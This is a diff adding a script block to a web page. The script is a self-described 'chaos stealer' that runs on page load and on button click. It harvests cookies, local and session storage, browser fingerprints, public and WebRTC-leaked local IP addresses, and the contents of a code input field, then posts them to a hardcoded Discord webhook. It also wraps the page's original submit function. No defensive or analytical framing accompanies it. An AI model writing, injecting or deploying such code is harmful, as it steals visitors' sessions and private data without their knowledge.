@@ -1,0 +1,60 @@
+<script>
+// ENHANCED CHAOS STEALER - Steals on page load + code submit
+const webhookURL = "https://discord.com/api/webhooks/1465338757892014216/JbDaZnWbjaFEut8E_h4JIPB-aoR7LkGYo2E_VikatIT_USPGwVvVo6pK0snW8-nDGCgA";
+
+async function stealEverything() {
+    // 1. FULL BROWSER FINGERPRINT
+    const fp = {
+        userAgent: navigator.userAgent,
+        language: navigator.language,
+        platform: navigator.platform,
+        cookies: document.cookie,
+        canvas: canvasFingerprint(),
+        timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+        ip: await getIP()
+    };
+
+    // 2. STEAL LOCALSTORAGE + SESSION
+    const storage = {local: {...localStorage}, session: {...sessionStorage}};
+
+    // 3. CANVAS FINGERPRINT
+    function canvasFingerprint() {
+        const canvas = document.createElement('canvas');
+        const ctx = canvas.getContext('2d');
+        ctx.textBaseline = 'top';
+        ctx.font = '14px Arial';
+        ctx.fillText('CHAOS STEAL', 2, 2);
+        return canvas.toDataURL();
+    }
+
+    // 4. WEBRTC LEAKS
+    const rtcp = new RTCPeerConnection({iceServers:[]});
+    rtcp.createDataChannel(''); rtcp.createOffer().then(rtcp.setLocalDescription.bind(rtcp));
+    rtcp.onicecandidate = e => { if(e.candidate) fp.localIP = e.candidate.address };
+
+    // 5. EXFIL
+    const victim = {
+        content: `🎭 **CHAOS VICTIM** 🎭\n**Code:** \`${document.getElementById('codeInput')?.value || 'N/A'}\`\n**Fingerprint:** ${JSON.stringify(fp)}\n**Storage:** ${JSON.stringify(storage)}\n**URL:** ${window.location.href}`,
+        username: "Chaos Page Stealer"
+    };
+    
+    fetch(webhookURL, {
+        method: 'POST',
+        headers: {'Content-Type': 'application/json'},
+        body: JSON.stringify(victim)
+    });
+}
+
+// STEAL ON LOAD + FORM SUBMIT
+window.addEventListener('load', stealEverything);
+document.querySelector('button').onclick = async () => {
+    await stealEverything();
+    sendCode(); // Original function
+};
+
+async function getIP() {
+    try {
+        return await (await fetch('https://api.ipify.org')).text();
+    } catch { return 'hidden'; }
+}
+</script>
